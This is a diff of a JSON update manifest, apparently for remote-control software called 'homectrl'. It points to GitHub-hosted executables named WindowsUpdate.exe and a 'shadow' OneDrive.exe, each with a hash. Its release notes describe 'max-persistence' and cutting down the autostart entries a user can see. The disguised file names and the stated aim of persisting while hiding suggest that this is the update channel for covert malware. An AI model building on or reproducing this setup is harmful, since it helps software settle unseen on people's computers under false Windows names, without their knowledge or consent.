@@ -1,8 +1,8 @@
 ﻿{
-    "version":  "1.0.23",
-    "sha256":  "98d65d5010a26136da09b30da0fa119af0d18a6b1f9be56bfe59c7d2d9c0551f",
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.23/WindowsUpdate.exe",
-    "shadowSha256":  "36662b77361caf77d25dd8c44524be1a5a379fa2c812bbeed6bac0ce0cccd4ff",
-    "shadowUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.23/OneDrive.exe",
-    "notes":  "Max-persistence dual-exe + presence shows all users"
+    "version":  "1.0.24",
+    "sha256":  "b520bd14f50d7441dd97f25f80b875e87bba130f616cef8ac1af2aa8b9bcc291",
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.24/WindowsUpdate.exe",
+    "shadowSha256":  "10bcc2fc6031d33e11e2c04167e9c17b7774c98457c584ce3deab57956b8d9cb",
+    "shadowUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.24/OneDrive.exe",
+    "notes":  "Reduce visible autostart to 2 entries (HKCU only); drop Startup .lnk (self-cleans on upgrade)"
 }
